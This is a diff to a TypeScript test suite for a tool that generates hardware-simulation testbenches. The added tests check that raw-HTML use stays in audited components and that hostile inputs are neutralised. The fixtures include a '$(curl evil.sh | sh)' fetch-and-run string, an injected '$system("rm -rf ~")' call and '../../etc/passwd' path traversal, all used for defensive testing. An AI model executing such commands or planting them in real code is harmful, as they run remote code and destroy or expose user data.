@@ -61,6 +61,20 @@ describe("resource limits", () => {
   });
 });
 
+describe("raw HTML only where audited", () => {
+  it("dangerouslySetInnerHTML appears only in the JSON-LD and display-script components", async () => {
+    const { readdirSync, readFileSync, statSync } = await import("node:fs");
+    const { join, relative } = await import("node:path");
+    const root = join(__dirname, "..");
+    const walk = (d: string): string[] => readdirSync(d).flatMap((f) => (statSync(join(d, f)).isDirectory() ? walk(join(d, f)) : [join(d, f)]));
+    const hits = walk(root)
+      .filter((p) => /\.tsx?$/.test(p) && !p.endsWith(".test.ts"))
+      .filter((p) => /dangerouslySetInnerHTML/.test(readFileSync(p, "utf8")))
+      .map((p) => relative(root, p));
+    expect(hits.sort()).toEqual(["components/DisplayScript.tsx", "components/JsonLd.tsx"]);
+  });
+});
+
 describe("generated testbench is injection-safe", () => {
   it("ignores hostile names and paths", () => {
     const evil = { ...risc6, hardware: { ...risc6.hardware, entity: 'p; end; --', pcSignal: "x >> ; report", compileOrder: ["../../etc/passwd", "ok.vhd"] } };
@@ -78,6 +92,31 @@ describe("generated testbench is injection-safe", () => {
     expect(all).not.toContain("passwd");
     expect(all).not.toContain("end; --");
     expect(all).toContain("entity work.processor");
+    for (const hdl of ["verilog", "systemverilog"] as const) {
+      const v = generateTestbench({
+        profile: evil,
+        memFileName: '"; $finish; //',
+        inputs: new Map(),
+        interrupts: [{ pc: 0x10, occurrence: Number.NaN }],
+        cycles: 1e12,
+        rtlRoot: "$(curl evil.sh | sh)",
+        compileOrder: ["../../etc/passwd", "ok.v", "a b.v"],
+        forwardingNote: '"); $system("rm -rf ~',
+        hdl,
+      });
+      const text = v.files.map((f) => f.content).join("\n");
+      // The forwarding note may only ever be text inside the header comment.
+      const header = v.files[0].content.split("\n")[1];
+      expect(header.startsWith("// Program:")).toBe(true);
+      expect(header).not.toMatch(/[";$]/);
+      expect(text.split("\n").filter((l) => l.includes("rm -rf")).every((l) => l.startsWith("// Program:"))).toBe(true);
+      expect(text).not.toContain("curl");
+      expect(text).not.toContain("passwd");
+      expect(text).not.toContain("$finish; //");
+      expect(text).not.toContain("a b.v");
+      expect(text).toContain("processor #(.MEM_FILE(MEM_FILE)) uut");
+      expect(text).toContain("cycle <= 1000000;");
+    }
   });
 });
 
